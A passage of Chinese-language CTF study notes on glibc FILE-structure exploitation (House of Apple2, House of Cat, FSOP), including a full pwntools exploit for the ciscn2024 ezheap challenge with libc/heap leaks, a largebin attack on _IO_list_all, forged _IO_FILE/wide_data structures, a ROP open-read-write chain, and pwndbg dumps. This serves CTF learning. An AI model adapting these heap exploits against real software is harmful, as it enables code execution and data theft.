+      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; wch == L&#39;\n&#39;))
+    if (_IO_do_flush (f) == EOF)
+      return WEOF;
+  return wch;
+}
+</code></pre>
+<p>其中只有进行到_IO_wdoallocbuf才能到达我们的目标 ，所以我们需要绕过三个检查：</p>
+<pre><code class="language-c">1.if (f-&gt;_flags &amp; _IO_NO_WRITES) 
+
+2.if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
+
+3.if (f-&gt;_wide_data-&gt;_IO_write_base == 0)
+</code></pre>
+<h5>_IO_wdoallocbuf</h5><pre><code class="language-c">void
+_IO_wdoallocbuf (FILE *fp)
+{
+  if (fp-&gt;_wide_data-&gt;_IO_buf_base)
+    return;
+  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))
+    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
+      return;
+  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,
+		     fp-&gt;_wide_data-&gt;_shortbuf + 1, 0);
+}
+</code></pre>
+<p>其中我们希望他进入_IO_WDOALLOCATE这个宏操作，这里我们有两个地方需要绕过：</p>
+<pre><code>1.fp-&gt;_wide_data-&gt;_IO_buf_base == 0
+2.fp-&gt;_flags &amp; _IO_UNBUFFERED(0x2) == 0 
+</code></pre>
+<p>总结：
+我们利用的流程：伪造IO结构体的vtable段为_IO_wfile_jumps，以绕过vtable check的检查，之后顺势跳转到 _IO_wfile_overflow函数，经过一系列函数和宏操作之后便call   *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp),其中fp就是指向我们伪造的IO结构体的指针。这里给一张图方便理解。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401214648892.png" alt="image-20250401214648892"></p>
+<p>需要绕过的检查</p>
+<pre><code class="language-c">f-&gt;flags!=0x8  &amp;&amp;  f-&gt;flags!=0x800 &amp;&amp; f-&gt;flags!=0x2
+vtable设置为_IO_wfile_jumps使其能成功调用_IO_wfile_overflow即可
+_wide_data设置为可控堆地址heap_addr1，即满足*(f + 0xa0) = heap_addr1
+_wide_data-&gt;_IO_write_base设置为0，即满足*(heap_addr1 + 0x18) = 0
+_wide_data-&gt;_IO_buf_base设置为0，即满足*(heap_addr1 + 0x30) = 0
+_wide_data-&gt;_wide_vtable设置为可控堆地址heap_addr2，即满足*(heap_addr1 + 0xe0) = heap_addr2
+_wide_data-&gt;_wide_vtable-&gt;doallocate设置为地址C用于劫持执行流，即满足*(heap_addr2 + 0x68) = C
+</code></pre>
+<h2 id="section-43">例题</h2><h3 id="section-44">ciscn2024 ezheap</h3><p>2.35，沙箱没禁orw，add申请的堆块会先执行内容赋0操作，无uaf，edit可以自己定义输入的长度。</p>
+<pre><code class="language-BASH"> 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
+ 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
+ 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
+ 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
+ 0008: 0x15 0x01 0x00 0x0000000a  if (A == mprotect) goto 0010
+ 0009: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0011
+ 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0011: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre>
+<p>exp</p>
+<p>先申请多个堆块，通过释放一个很大的堆块进入unstoredbin内，后用edit将当前chunk和下一个chunk的size段和pre_size填满，然后show()，就能全都打印出来，就能泄露libc基址了，之后申请比他大的堆块，将其逼入largbin内，就可以实现泄露堆地址和打largbin attack了,同时我们在恢复堆块二的原貌时将 (next_size_bk) -&gt; 改为_IO_list_all-0x20，便于后续将堆地址写入_IO_list_all</p>
+<pre><code class="language-py">#1---泄露libc
+create(0x200,b&#39;./flag\x00\x00&#39;)#0
+create(0x420,b&#39;a&#39;*16)#1
+create(0x200,b&#39;./flag\x00\x00&#39;)#2
+create(0x410,b&#39;a&#39;*16)#3
+delete(1)
+edit(0,0x210,b&#39;a&#39;*0x20f+b&#39;c&#39;)#覆盖到1堆的pre_size和size位，方便show，应为pringtf见\x00截断
+show(0)
+libc_base=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))-0x21ace0
+print(&quot;libc_base=&quot;,hex(libc_base))
+
+#2---泄露fd和heap_base并恢复原样
+edit(0,0x210,b&#39;a&#39;*0x200+p64(0)+p64(0x431))
+create(0x430,b&#39;as&#39;)#4,同时把1号放入large_bin
+edit(0,0x210,b&#39;a&#39;*0x20f+b&#39;c&#39;)
+show(0)
+fd=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) #为了等会恢复1号堆，不然恢复时fd填不对
+edit(0,0x220,b&#39;a&#39;*0x21f+b&#39;c&#39;)
+show(0)
+p.recvuntil(b&#39;ac&#39;)
+heap_addr1=u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+heap_base=heap_addr1-( 0x5617db1db510-0x5617db1d9000)
+heap_addr0=0x5635cdee0310-0x5635cdede000+heap_base
+heap_addr2=heap_base+0x5626d7c3b950- 0x5626d7c39000
+print(&quot;heap_base=&quot;,hex(heap_base))
+#恢复1号为原样并改bk_nextsize为_IO_list_all-0x20做一个large_bin_attack准备工作
+edit(0,0x230,b&#39;a&#39;*0x200+p64(0)+p64(0x431)+p64(fd)*2+p64(heap_addr1)+p64(libc_base+libc.sym[&#39;_IO_list_all&#39;]-0x20))
+ 
+#3---house_of_apple2构造
+pop_rdi_addr=libc_base+0x000000000002a3e5
+pop_rsi_addr=libc_base+0x000000000002be51
+pop_rdx_addr=libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()
+pop_rax_addr=libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()
+open_addr = libc_base + libc.sym[&#39;open&#39;]
+read_addr = libc_base + libc.sym[&#39;read&#39;]
+write_addr = libc_base + libc.sym[&#39;write&#39;]
+syscall_addr=libc_base+0x91316
+_IO_wfile_jumps = libc.sym._IO_wfile_jumps+libc_base
+mprotect_addr=libc_base+libc.sym[&#39;mprotect&#39;]
+print(&quot;_IO_wfile_jumps=&quot;,hex(_IO_wfile_jumps))
+ 
+fake_IO_FILE=flat({
+    0x0:0,  #_IO_read_end
+    0x8:0,  #_IO_read_base
+    0x10:0,  #_IO_write_base
+    0x18:0,  #_IO_write_ptr
+    0x20:0,  #_IO_write_end
+    0x28:0,  #_IO_buf_base
+    0x30:0,  #_IO_buf_end
+    0x38:0,  #_IO_save_base
+    0x40:0,  #_IO_backup_base
+    0x48:0,#_IO_save_end
+    0x50:0,  #_markers
+    0x58:0,  #_chain
+    0x60:0,  #_fileno
+    0x68:0,  #_old_offset
+    0x70:0,  #_cur_column
+    0x78:0,  #_lock
+    0x80:0,  #_offset
+    0x88:0,  #_codecvt
+    0x90:heap_addr0,  #_wide_data
+    0x98:0,  #_freeres_list
+    0xa0:0,  #_freeres_buf
+    0xa8:0,  #__pad5
+    0xb0:0,  #_mode
+    0xc8:_IO_wfile_jumps,#vtable
+ 
+})
+
+fake_IO_wide_data=flat({
+    0x0:[libc_base+0x000000000002a3e5,#pop rdi
+        heap_addr2,
+        libc_base+0x000000000002be51,#0x000000000002be51 : pop rsi ; ret
+        0,##
+        libc_base+0x000000000011f2e7,#0x000000000011f2e7 : pop rdx ; pop r12 ; ret
+        0,
+        0,##
+        libc_base+0x0000000000045eb0,#0x0000000000045eb0 : pop rax ; ret
+        2,
+        libc_base+libc.sym[&quot;syscall&quot;]+27,
+        libc_base+0x000000000002a3e5,#pop rdi
+        3,
+        libc_base+0x000000000002be51,#0x000000000002be51 : pop rsi ; ret,
+        heap_addr2,
+        libc_base+0x000000000011f2e7,#0x000000000011f2e7 : pop rdx ; pop r12 ; ret,
+        0x100,
+        0,
+        read_addr,
+        libc_base+0x000000000002a3e5,#pop rdi,
+        1,
+        write_addr,],
+    0xa8:0,
+    0xb0:0,
+    0xb8:0,
+    0xc0:0,
+    0xc8:0,
+    0xd0:0,
+    0xd8:0,
+    0xe0:0x5635cdee03f0-0x5635cdede000+heap_base, #heap_addr0+0xe0
+    0x148:libc_base+0x000000000005a120 #mov rsp, rdx ; ret
+})
+edit(3,len(fake_IO_FILE),fake_IO_FILE)
+edit(0,len(fake_IO_wide_data),fake_IO_wide_data)
+delete(3) #进unsorted_bin
+create(0x430,b&#39;c&#39;) #5，触发largebin_attack
+debug()
+p.sendlineafter(b&quot;choice &gt;&gt; &quot;,&#39;5&#39;)
+
+p.interactive()
+</code></pre>
+<p>第三步伪造io_file</p>
+<pre><code class="language-c">//改前
+pwndbg&gt;   p *_IO_list_all
+$1 = {
+  file = {
+    _flags = -72540025,
+    _IO_read_ptr = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_read_end = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_read_base = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_write_base = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_write_ptr = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_write_end = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_buf_base = 0x7f6d8e63a723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,
+    _IO_buf_end = 0x7f6d8e63a724 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x7f6d8e63a780 &lt;_IO_2_1_stdout_&gt;,
+    _fileno = 2,
+    _flags2 = 0,
+    _old_offset = -1,
+    _cur_column = 0,
+    _vtable_offset = 0 &#39;\000&#39;,
+    _shortbuf = &quot;&quot;,
+    _lock = 0x7f6d8e63ba60 &lt;_IO_stdfile_2_lock&gt;,
+    _offset = -1,
+    _codecvt = 0x0,
+    _wide_data = 0x7f6d8e6398a0 &lt;_IO_wide_data_2&gt;,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0,
+    _mode = 0,
+    _unused2 = &#39;\000&#39; &lt;repeats 19 times&gt;
+  },
+  vtable = 0x7f6d8e636600 &lt;_IO_file_jumps&gt;
+}
+
+//改后
+pwndbg&gt;   p *_IO_list_all
+$1 = {
+  file = {
+    _flags = 0,
+    _IO_read_ptr = 0x421 &lt;error: Cannot access memory at address 0x421&gt;,
+    _IO_read_end = 0x7f6a19c8e0d0 &lt;main_arena+1104&gt; &quot;\300\340\310\031j\177&quot;,
+    _IO_read_base = 0x55bd11fbe510 &quot;&quot;,
+    _IO_write_base = 0x55bd11fbe510 &quot;&quot;,
+    _IO_write_ptr = 0x7f6a19c8e660 &lt;_nl_global_locale+224&gt; &quot;\302\321\304\031j\177&quot;,
+    _IO_write_end = 0x0,
+    _IO_buf_base = 0x0,
+    _IO_buf_end = 0x0,
+    _IO_save_base = 0x0,
+    _IO_backup_base = 0x0,
+    _IO_save_end = 0x0,
+    _markers = 0x0,
+    _chain = 0x0,
+    _fileno = 0,
+    _flags2 = 0,
+    _old_offset = 0,
+    _cur_column = 0,
+    _vtable_offset = 0 &#39;\000&#39;,
+    _shortbuf = &quot;&quot;,
+    _lock = 0x0,
+    _offset = 0,
+    _codecvt = 0x0,
+    _wide_data = 0x55bd11fbe310,
+    _freeres_list = 0x0,
+    _freeres_buf = 0x0,
+    __pad5 = 0,
+    _mode = 0,
+    _unused2 = &quot;\000\000\000\000vaabwaabxaabyaab&quot;
+  },
+  vtable = 0x7f6a19c8a0c0 &lt;_IO_wfile_jumps&gt;
+}
+</code></pre>
+<p>其通过_wide_data指向了下一个伪造结构体</p>
+<pre><code class="language-c">pwndbg&gt;  p *(struct _IO_wide_data *) 0x55bd11fbe310
+$2 = {
+  _IO_read_ptr = 0x7f6a19a9d3e5 &lt;iconv+197&gt; L&quot;_\x1f0f66c3\204\000\000H\x7b74f685H\x85482e8b\x487374ed\x8b4d128b\000I\xc931e189L\003\004%\000\000\000\000H\001\x578e8ea\000\000H++I\001,$\x7608f883\xd8d4884\x1adbae\x5aba\000H\xdb9a358d\032\000H\x29e23d8d\033\000\xfa0de8\000\017\037D\000\000M\x2374f685M\x4900458b\x8948e189\x31d231e9\xf0014df6\x52de8\000\xffff2fe9\x841f0fff\000\000\000\000\000I\x3145e189\x31c931c0\xe8f631d2\017\005\000\000\xffff19e9\xf2e66ff\037\204\000\000H\xf979058b\036\000d\x900c7\000\000H\xffffc0c7\x1ae9ffff\x66ffffff\017\037D\000\000H\xf959058b\036\000d\x1600c7\000\000H\xffffc0c7\xfae9ffff\x66fffffe\017\037D\000\000H\xf939058b\036\000d\x5400c7\000\000H\xffffc0c7\xdae9ffff\x66fffffe\017\037D\000\000H\xf919058b\036\000d\x700c7\000\000H\xffffc0c7\xbae9ffff\xe8fffffeA\x900010c0\xfa1e0ff3H\x74ffff83\026H\xe808ec83\x68d\xc019d8f7H\xc308c483\017\037@\000H\xf8d9058b\036\000d\x900c7\000\000\xffffffb8\x2e66c3ff\017\037\204\000\000f\x1e0ff390\x894855fa\x415741e5\x5641d789AUATSH\000\000\000\000\000\000\000\000\x2d1\000\000\000\000&quot;...,
+  _IO_read_end = 0x55bd11fbe950 L&quot;./flag\000\000&quot;,
+  _IO_read_base = 0x7f6a19a9ee51 &lt;__gconv_close_transform+225&gt; L&quot;^\x441f0fc3\000\000H\xfbd13d8d\036\000\x6549ce8\000\x2e66e2eb\017\037\204\000\000H\xfbb93d8d\036\000\x653b4e8\000\xffff16e9\xf2e66ff\037\204\000\000\017\037D\000\000UH\x5741e589AVAUATSH\x6438ec83H\x2825048b\000\000\000H\x48c84589\xfbab058d\036\000H\x8548188b\x63850fdb\003\000\000L\xfb882d8b\036\000M\x840fed85_\002\000\000L\xb7e8ef89\x48ffffc5\x8948e789\x408d48c2!H\x48b84589\x4838428d\x2548c689\000\x48fffff0)\xe68348c7\xfc3948f0t\025H\x1000ec81\000\000H\xf8248c83\017\000\000\000H9\x81eb75fc\xfffe6\000H)\xf68548f4\017\x27485\000H\xf247c8dL\x8348ee89\x8948f0e7}\xc4a4e8c0\xf66ffffo\005\x1b08fc\061\x66ff31f6\017o\r\000\t\033\000\xf3a00c6\021@\001\017\021H\021\xe9270e8\000I\x8548c589\x3a840fc0\002\000\000H\x1ce8c789\x4cffffc5\x48c0658b\x48a84589\x4801c083\xbeb04589:\000\000\000L\x6fe8e789\x49ffffc6\x8548c789\x22840fc0\002\000\000A\676\000\x1f0f06eb\000I\x8d48c789K\001\061\x7f8d49c0\001\x3abe\000I9\xfb894ccf\017\x141c095\xc635e8c6\x8548ffff\x41d875c0\x41ff568d\x4d017e8dc\xd26348feH\017\x48b055afc\xe7c148ff\004L\001\x7d0348ff\xd70148b8&quot;...,
+  _IO_write_base = 0x0,
+  _IO_write_ptr = 0x7f6a19b922e7 &lt;__qecvt+39&gt; L&quot;ZA\\\x441f0fc3\000\000\xfa1e0ff3\x15b8\000ATI\x8d48f489\065l\x39000bae\x2474ffc7\030\017N\x2474ffc7\030L\xc289e789\061\x1562e8c0\x4c58fff4\x415ae089\\\xf2e66c3\037\204\000\000\xfa1e0ff3AWAVAUATUSH\xdb18ec83l$PHp\000\000\000\000\000\000\000!\000\000\000\000\000\000\000\020\xffea5bd4\177&quot;, &#39;\000&#39; &lt;repeats 18 times&gt;, &quot;\061\027\000\000\000\000\000\000\006\xe7020be2\177\000\000\001\000\000\001 \000\000\000 \x3caa2fe0V\000\000\xaa44d2a0&lt;V\000\000\016\xe7020be2\177\000\000\000\000\001\001\&quot;\000\000\000(\x3caa2fe0V\000\000\xaa44d2a4&lt;V\000\000o\xe7020beb\177\000\000\000\000\003\003$\000\000\000(\x3caa2fe0V\000\000\xaa44d2a4&lt;V\000\000@\xe7020eb3\177\000\000\000\000\001\001\002\000\000\000(\x3caa2fe0V\000\000\xaa44d2a4&lt;V\000\000-/\f\002\x7fe7\000\000\001\001\000\000\000\000&quot;...,
+  _IO_write_end = 0x0,
+  _IO_buf_base = 0x0,
+  _IO_buf_end = 0x7f6a19ab8eb0 &lt;mblen+112&gt; L&quot;X\x1f0f66c3D\000\000H\x1961158d\035\000H\x31fa058d\035\000H9\x48d474d3\xfde8df89\x480008cc\xeb28438b\x801f0fc6&quot;,
+  _IO_save_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,
+  _IO_backup_base = 0x7f6a19b9188b &lt;syscall+27&gt; L&quot;\017\005H=\001\x73fffff0\001\xd8b48c3s\xf7000fb5\x18964d8H\xc3ffc883f\017\037\204\000\000\xfa1e0ff3ATU\x8953fd89\xec8148f3\240dH\x2825048b\000\000P\000\000\000\000\000\000\000!\000\000\000\000\000\000\000\060\xffea5bd6\177&quot;, &#39;\000&#39; &lt;repeats 18 times&gt;, &quot;!\000\000\000\000\000\000\000\xea5bcc90\x7fff&quot;, &#39;\000&#39; &lt;repeats 16 times&gt;, &quot;\241\000\000\000\000\xca54db87\071V\000\000\vo:\000\x1de53896\x9fbf61c8&lt;V\000\000\x9f8a74d0&lt;V\000\000`\002\x7fe727af\000\000\000#\x7fe727af\000\000\000\000\000\000\000\000\000\000\001\000\000\000\001\000\000\000\x9fb382a3&lt;V\000\000|\x3c9fb382V\000\000\x9f6355e7&lt;V\000\000`u\x563ca9f9\000\000\000++CCUNG\000\004\x7fe727af\000\000\000\000\000\000\000\000\000\000 \a&amp;\x7ffcd0\000\xffffffff\b\000\000\000\xaa313ee0&lt;V\000\000&quot;...,
+  _IO_save_end = 0x7f6a19a9d3e5 &lt;iconv+197&gt; L&quot;_\x1f0f66c3\204\000\000H\x7b74f685H\x85482e8b\x487374ed\x8b4d128b\000I\xc931e189L\003\004%\000\000\000\000H\001\x578e8ea\000\000H++I\001,$\x7608f883\xd8d4884\x1adbae\x5aba\000H\xdb9a358d\032\000H\x29e23d8d\033\000\xfa0de8\000\017\037D\000\000M\x2374f685M\x4900458b\x8948e189\x31d231e9\xf0014df6\x52de8\000\xffff2fe9\x841f0fff\000\000\000\000\000I\x3145e189\x31c931c0\xe8f631d2\017\005\000\000\xffff19e9\xf2e66ff\037\204\000\000H\xf979058b\036\000d\x900c7\000\000H\xffffc0c7\x1ae9ffff\x66ffffff\017\037D\000\000H\xf959058b\036\000d\x1600c7\000\000H\xffffc0c7\xfae9ffff\x66fffffe\017\037D\000\000H\xf939058b\036\000d\x5400c7\000\000H\xffffc0c7\xdae9ffff\x66fffffe\017\037D\000\000H\xf919058b\036\000d\x700c7\000\000H\xffffc0c7\xbae9ffff\xe8fffffeA\x900010c0\xfa1e0ff3H\x74ffff83\026H\xe808ec83\x68d\xc019d8f7H\xc308c483\017\037@\000H\xf8d9058b\036\000d\x900c7\000\000\xffffffb8\x2e66c3ff\017\037\204\000\000f\x1e0ff390\x894855fa\x415741e5\x5641d789AUATSH\000\000\000\000\000\000\000\000\x3e1\000\000\000\000&quot;...,
+  _IO_state = {
+    __count = 3,
+    __value = {
+      __wch = 0,
+      __wchb = &quot;\000\000\000&quot;
+    }
+  },
+  _IO_last_state = {
+    __count = 430566993,
+    __value = {
+      __wch = 32618,
+      __wchb = &quot;j\177\000&quot;
+    }
+  },
+  _codecvt = {
+    __cd_in = {
+      step = 0x55bd11fbe950,
+      step_data = {
+        __outbuf = 0x7f6a19b922e7 &lt;__qecvt+39&gt; &quot;ZA\\\303\017\037D&quot;,
+        __outbufend = 0x100 &lt;error: Cannot access memory at address 0x100&gt;,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 431519696,
+        __statep = 0x7f6a19a9d3e5 &lt;iconv+197&gt;,
+        __state = {
+          __count = 1,
+          __value = {
+            __wch = 0,
+            __wchb = &quot;\000\000\000&quot;
+          }
+        }
+      }
+    },
+    __cd_out = {
+      step = 0x7f6a19b87870 &lt;__GI___libc_write&gt;,
+      step_data = {
+        __outbuf = 0x0,
+        __outbufend = 0x0,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 0,
+        __statep = 0x0,
+        __state = {
+          __count = 0,
+          __value = {
+            __wch = 0,
+            __wchb = &quot;\000\000\000&quot;
+          }
+        }
+      }
+    }
+  },
+  _shortbuf = L&quot;&quot;,
+  _wide_vtable = 0x55bd11fbe3f0
+}
+</code></pre>
+<p>经过前置学习，我们知道其最后执行的指令是：call *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</p>
+<p>在__doallocate处写入了__push___start_context+96   #mov rsp, rdx ; ret</p>
+<p>这里是将rdx的值赋值给了rsp以便后续执行rsp处的代码，那我们只需要在对应rdx处写入orw的指令就好，顺便说一下，这个版本的open是用opnenat实现的，所以要有syscall来调用。</p>
+<pre><code class="language-c">pwndbg&gt; p *(struct _IO_jump_t *) 0x55a62e17b3f0
+$3 = {
+  __dummy = 94172226237424,
+  __dummy2 = 7161111992057553257,
+  __finish = 0x6361616c6361616b,
+  __overflow = 0x6361616e6361616d,
+  __underflow = 0x636161706361616f,
+  __uflow = 0x6361617263616171,
+  __pbackfail = 0x6361617463616173,
+  __xsputn = 0x6361617663616175,
+  __xsgetn = 0x6361617863616177,
+  __seekoff = 0x6461617a63616179,
+  __seekpos = 0x6461616364616162,
+  __setbuf = 0x6461616564616164,
+  __sync = 0x6461616764616166,
+  __doallocate = 0x7f678340c120 &lt;__push___start_context+96&gt;,
+  __read = 0x6161616161616161,
+  __write = 0x6161616161616161,
+  __seek = 0x6161616161616161,
+  __close = 0x6161616161616161,
+  __stat = 0x6161616161616161,
+  __showmanyc = 0x6161616161616161,
+  __imbue = 0x6161616161616161
+}
+</code></pre>
+<h1>house of cat</h1><p><a href="https://blog.csdn.net/2301_79327647/article/details/141166770?spm=1001.2014.3001.5502">https://blog.csdn.net/2301_79327647/article/details/141166770?spm=1001.2014.3001.5502</a></p>
+<h2 id="section-45">介绍</h2><p><strong>通过largebin 来一次泄露libc地址和堆块地址，然后两次edit，第一个修改stderr结构体（以为malloc_assert会调用stderr来输出报错信息），第二次修改top_chunk来修改size来触发 _malloc_assert</strong></p>
+<h2 id="section-46">例题</h2><h3 id="section-47">hgame2025 where is my vulnrability</h3><p>2.39无hook，沙盒禁用execve只能orw，uaf，申请堆块大于等于0x500小于0x900</p>
+<p>exp</p>
+<pre><code>
+</code></pre>
+<h1>FSOP</h1><p><a href="https://blog.csdn.net/2301_79327647/article/details/140584565?spm=1001.2014.3001.5502">https://blog.csdn.net/2301_79327647/article/details/140584565?spm=1001.2014.3001.5502</a></p>
+<p><a href="https://bbs.kanxue.com/thread-284331.htm#msg_header_h1_1">https://bbs.kanxue.com/thread-284331.htm#msg_header_h1_1</a></p>
+<p>I/O流的操作，如stdin stdout stderr，是由FILE结构体所承载的。因为“一切皆文件”。</p>
+<h2 id="section-48">FILE结构体</h2><h3 id="section-49">_IO_FILE_plus</h3><p>这是_IO_FILE的扩展结构，也是现在真正的主流结构，首先是引用了FILE结构，即_IO_FILE本身，同时扩展了一个IO_jump_t类型的虚函数表(vtable,vitural table)指针。</p>
+<p>虚表：其中记录了本类中所有虚函数的函数指针，也就是说是个函数指针数组的起始位置。</p>
+<pre><code class="language-c">struct _IO_FILE_plus
+{
+  _IO_FILE file;
+  const struct _IO_jump_t *vtable;
+};
+</code></pre>
+<p>完整的_IO_FILE_plus结构体内部的各字段偏移如下</p>
+<pre><code class="language-py">0x0   _flags
+0x8   _IO_read_ptr
+0x10  _IO_read_end
+0x18  _IO_read_base
+0x20  _IO_write_base
+0x28  _IO_write_ptr
+0x30  _IO_write_end
+0x38  _IO_buf_base
+0x40  _IO_buf_end
+0x48  _IO_save_base
+0x50  _IO_backup_base
+0x58  _IO_save_end
+0x60  _markers
+0x68  _chain            #
+0x70  _fileno
+0x74  _flags2
+0x78  _old_offset
+0x80  _cur_column
+0x82  _vtable_offset
+0x83  _shortbuf
+0x88  _lock
+0x90  _offsetc
+0x98  _codecvt
+0xa0  _wide_data          #
+0xa8  _freeres_list
+0xb0  _freeres_buf
+0xb8  __pad5
+0xc0  _mode
+0xc4  _unused2
+0xd8  vtable              #
+</code></pre>
+<p>在这些变量中，我们先记住两个东西：</p>
+<p>1.chain域（用来串联各个file结构成单向链表的指针）在0x68的偏移处。</p>
+<p>2.vtable域在0xd8的偏移处。</p>
+<h3 id="section-50">_IO_FILE</h3><p>​	定义了文件的读写过程中需要用到的开始和结束的地址信息等，比如，write_base,write_end,这是控制写出内容的地址范围的，
+如果攻击过程可以更改这两个值，那么，就可以在下次puts()、printf()等输出类函数执行的时候，造成被指定内存上的信息泄露。</p>
+<pre><code class="language-c">struct _IO_FILE
+{
+  int _flags;/*【flag标志位】高两位字是 _IO_MAGIC，在这里是固定的&quot;0xfbad&quot;，低两位则决定了程序的执行状态。 */
+ 
+  /* 以下指针对应于 C++ 的 streambuf 协议。 */
+  char *_IO_read_ptr;    /*【读入】 当前读取指针 */
+  char *_IO_read_end;    /*【读入】 读取区域的结束位置。 */
+  char *_IO_read_base;    /*【读入】 回退区和读取区域的起始位置。 */
+   
+  char *_IO_write_base;    /*【写出】 写出区域的起始位置。 */
+  char *_IO_write_ptr;    /*【写出】 当前写出指针。 */
+  char *_IO_write_end;    /*【写出】 写出区域的结束位置。 */
+  char *_IO_buf_base;    /* 保留区域的起始位置。 */
+  char *_IO_buf_end;    /* 保留区域的结束位置。 */
+ 
+  /* 以下字段用于支持回退和撤销操作。 */
+  char *_IO_save_base; /* 非当前读取区域的起始位置指针。 */
+  char *_IO_backup_base;  /* 回退区域的第一个有效字符指针 */
+  char *_IO_save_end; /* 非当前读取区域的结束位置指针。 */
+  struct _IO_marker *_markers;
+  struct _IO_FILE *_chain;/*【链接】这里就是_IO_FILE之间的chain指针*/
+  int _fileno;
+  int _flags2;
+  __off_t _old_offset; /* 以前是 _offset，但它太小了。 (注：原话如此))*/
+ 
+  /* pbase() 的列号加1；0 表示未知。 */
+  unsigned short _cur_column;
+  signed char _vtable_offset;
+  char _shortbuf[1];
+ 
+  _IO_lock_t *_lock;
+#ifdef _IO_USE_OLD_IO_FILE
+};
+</code></pre>
+<p>chain域</p>
+<p>通过chain指针，FILE(IO_FILE)结构体互相之间形成了链接关系，
+_IO_list_all则是指向首个FILE结构体，一般就是stderr,IO_list_all同时是libc库文件里的一个指针，可以通过偏移获取其值</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401211503077.png" alt="image-20250401211503077"></p>
+<p>验证</p>
+<p>stderr</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401213039923.png" alt="image-20250401213039923"></p>
+<p>2.stdout</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401213105004.png" alt="image-20250401213105004"></p>
+<p>3.stdin:</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401213125042.png" alt="image-20250401213125042"></p>
+<h3 id="section-51">_IO_jump_t  (vtable)</h3><p>​	vtable虚表指针所属的IO_jump_t类型的结构如下，这个小小的表，承载了相当多的虚指针，修改这些指针可以实现类似于got表劫持的效果</p>
+<pre><code class="language-c">struct _IO_jump_t
+{
+    JUMP_FIELD(size_t, __dummy);
+    JUMP_FIELD(size_t, __dummy2);
+    JUMP_FIELD(_IO_finish_t, __finish);
+    JUMP_FIELD(_IO_overflow_t, __overflow);
+    JUMP_FIELD(_IO_underflow_t, __underflow);
+    JUMP_FIELD(_IO_underflow_t, __uflow);
+    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
+    /* showmany */
+    JUMP_FIELD(_IO_xsputn_t, __xsputn);
+    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
+    JUMP_FIELD(_IO_seekoff_t, __seekoff);
+    JUMP_FIELD(_IO_seekpos_t, __seekpos);
+    JUMP_FIELD(_IO_setbuf_t, __setbuf);
+    JUMP_FIELD(_IO_sync_t, __sync);
+    JUMP_FIELD(_IO_doallocate_t, __doallocate);
+    JUMP_FIELD(_IO_read_t, __read);
+    JUMP_FIELD(_IO_write_t, __write);
+    JUMP_FIELD(_IO_seek_t, __seek);
+    JUMP_FIELD(_IO_close_t, __close);
+    JUMP_FIELD(_IO_stat_t, __stat);
+    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
+    JUMP_FIELD(_IO_imbue_t, __imbue);
+#if 0
+    get_column;
+    set_column;
+#endif
+};
+</code></pre>
+<p>​	这个函数表中一共有19个虚函数，分别完成IO相关的功能，由IO函数调用，只要涉及到io操作，都会间接调用_IO开头的虚函数，比如调用write就一定会间接调用__write,调用puts就一定会间接调用__xsputn等等,显然，这就可能造成类似于got表劫持攻击的情况：控制了__xsputn为onegadget，调用puts就会经过这一必然被执行的地方，从而getshell</p>
